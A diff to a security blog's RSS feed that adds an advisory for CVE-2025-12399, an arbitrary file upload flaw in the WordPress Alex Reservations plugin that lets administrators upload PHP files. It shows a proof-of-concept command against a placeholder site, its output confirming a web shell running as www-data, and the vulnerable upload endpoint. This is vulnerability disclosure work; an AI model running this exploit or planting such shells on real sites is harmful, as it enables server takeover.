@@ -6,8 +6,15 @@
     <description>Recent content in Posts on </description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 16 Sep 2025 00:01:00 +0000</lastBuildDate>
+    <lastBuildDate>Fri, 07 Nov 2025 00:01:00 +0000</lastBuildDate>
     <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Alex Reservations: Smart Restaurant Booking &lt;= 2.2.3 - Authenticated (Admin&#43;) Arbitrary File Upload</title>
+      <link>/posts/cve-2025-12399/</link>
+      <pubDate>Fri, 07 Nov 2025 00:01:00 +0000</pubDate>
+      <guid>/posts/cve-2025-12399/</guid>
+      <description>&lt;h3 id=&#34;cve-2025-12399&#34;&gt;CVE-2025-12399&lt;/h3&gt;&#xA;&lt;p&gt;The WordPress &lt;a href=&#34;https://wordpress.org/plugins/alex-reservations&#34; target=&#34;_blank&#34;&gt;Alex Reservations&lt;/a&gt; plugin (versions 2.2.3 and prior) contains an arbitrary file upload vulnerability that allows authenticated WordPress administrators to upload malicious PHP files to the server, potentially leading to remote code execution.&lt;/p&gt;&#xA;&lt;h2 id=&#34;tldr-exploits&#34;&gt;TL;DR Exploits&lt;/h2&gt;&#xA;&lt;p&gt;A POC &lt;a href=&#34;https://github.com/d0n601/CVE-2025-12399/blob/master/CVE-2025-12399.py&#34; target=&#34;_blank&#34;&gt;CVE-2025-12399.py&lt;/a&gt; is provided to demonstrate a remote attacker uploading &lt;code&gt;shell.php&lt;/code&gt; and executing remote code:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 ./CVE-2025-12399.py https://TARGETSITE.com admin &amp;#34;$PASSWORD&amp;#34;                                                                                            &#xA;[+] Target: http://TARGETSITE.com&#xA;[+] Username: admin&#xA;[+] Nonce obtained: 022b25d0a5&#xA;[+] File uploaded successfully!&#xA;[+] Shell URL: https://TARGETSITE.com/wp-content/uploads/alex-reservations/2025/10/shell.php&#xA;[+] Command output:&#xA;uid=33(www-data) gid=33(www-data) groups=33(www-data)&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;technical-description&#34;&gt;Technical Description&lt;/h2&gt;&#xA;&lt;p&gt;The vulnerability exists in the &lt;code&gt;UploadFileController.php&lt;/code&gt; file at the &lt;code&gt;/wp-json/srr/v1/app/upload/file&lt;/code&gt; endpoint. The upload functionality lacks proper file validation and only performs basic filename sanitization using a regex pattern. This allows authenticated WordPress administrators to upload arbitrary files, including PHP files that can be executed on the server.&lt;/p&gt;</description>
+    </item>
     <item>
       <title>StoreEngine – Powerful WordPress eCommerce Plugin for Payments, Memberships, Affiliates, Sales &amp; More &lt;= 1.4.0 - Authenticated (Subscriber&#43;) Arbitrary File Upload</title>
       <link>/posts/cve-2025-9216/</link>
